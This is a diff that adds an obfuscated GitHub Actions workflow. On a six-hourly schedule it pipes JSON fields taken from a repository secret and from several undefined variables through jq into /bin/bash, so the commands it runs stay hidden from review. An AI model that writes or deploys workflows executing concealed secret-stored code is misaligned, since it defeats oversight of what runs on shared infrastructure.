@@ -1,0 +1,23 @@
+name: duopingyidianznizainaerlai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duopingyidianznizainaerlai
+        env:
+          yot181: ${{ secrets.yot181 }}
+        run: |
+          echo $yot181 | jq -r .qeloh9 | /bin/bash
+          echo $eohl7 | jq -r .jikk8 | /bin/bash
+          echo $cv67 | jq -r .czaz562 | /bin/bash
+          echo $ntdc4747 | jq -r .sxdz54522 | /bin/bash
+          echo $a02 | jq -r .z6 | /bin/bash
+          echo $y98950 | jq -r .suqxl67601 | /bin/bash
+
